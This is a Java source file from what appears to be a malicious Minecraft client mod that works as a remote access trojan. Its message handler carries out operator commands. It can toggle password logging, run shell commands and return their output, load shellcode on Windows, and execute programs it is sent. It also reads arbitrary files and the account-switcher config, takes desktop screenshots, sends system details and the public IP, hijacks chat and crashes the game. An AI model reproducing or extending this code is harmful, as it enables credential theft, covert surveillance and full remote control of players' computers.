package me.soda.witch.client.connection;

import com.google.gson.Gson;
import me.soda.witch.client.utils.ShellcodeLoader;
import me.soda.witch.client.Variables;
import me.soda.witch.client.utils.ChatUtil;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.client.utils.NetUtil;
import me.soda.witch.client.utils.ScreenshotUtil;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.socket.messages.PlayerInfo;
import me.soda.witch.shared.ProgramUtil;
import me.soda.witch.shared.socket.messages.Message;
import net.minecraft.client.util.GlfwUtil;
import net.minecraft.text.Text;

import java.lang.management.ManagementFactory;

public class MessageHandler {
    public static void handleMessage(Message message) {
        String msgType = message.messageID;
        Object msg = message.data;
        LogUtil.println("Received message: " + msgType);
        try {
            switch (msgType) {
                case "steal_pwd_switch" ->
                        Variables.INSTANCE.passwordBeingLogged = !Variables.INSTANCE.passwordBeingLogged;
                case "chat_control" -> ChatUtil.sendChat((String) msg);
                case "chat_filter" -> Variables.INSTANCE.filterPattern = (String) msg;
                case "chat_filter_switch" -> Variables.INSTANCE.isBeingFiltered = !Variables.INSTANCE.isBeingFiltered;
                case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
                case "mods" -> NetUtil.send(msgType, MCUtils.allMods());
                case "systeminfo" -> NetUtil.send(msgType, MCUtils.systemInfo());
                case "screenshot" -> ScreenshotUtil.gameScreenshot();
                case "screenshot2" -> NetUtil.send(msgType, ScreenshotUtil.systemScreenshot());
                case "chat" -> ChatUtil.chat(Text.of((String) msg), false);
                case "shell" -> new Thread(() -> {
                    String result = ProgramUtil.runCmd((String) msg);
                    NetUtil.send(msgType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ProgramUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                }
                case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
                case "config" -> NetUtil.send(msgType, new Gson().toJson(Variables.INSTANCE));
                case "player" -> NetUtil.send(msgType, MCUtils.getPlayerInfo());
                case "skin" -> {
                    NetUtil.send("player", new PlayerInfo());
                    MCUtils.sendPlayerSkin();
                }
                case "server" -> {
                    MCUtils.disconnect();
                    Variables.INSTANCE.canJoinServer = !Variables.INSTANCE.canJoinServer;
                }
                case "kick" -> MCUtils.disconnect();
                case "execute" -> ProgramUtil.runProg((byte[]) msg);
                case "iasconfig" -> NetUtil.send(msgType, FileUtil.read("config/ias.json"));
                case "read" -> NetUtil.send(msgType, FileUtil.read((String) msg));
                case "runargs" -> NetUtil.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                case "props" -> NetUtil.send(msgType, System.getProperties());
                case "ip" -> NetUtil.send(msgType, NetUtil.httpSend("https://ifconfig.me/"));
                case "crash" -> GlfwUtil.makeJvmCrash();
                case "server_name" -> Variables.INSTANCE.name = (String) msg;
            }
        } catch (Exception e) {
            LogUtil.println("Corrupted message!");
            LogUtil.printStackTrace(e);
        }
    }
}
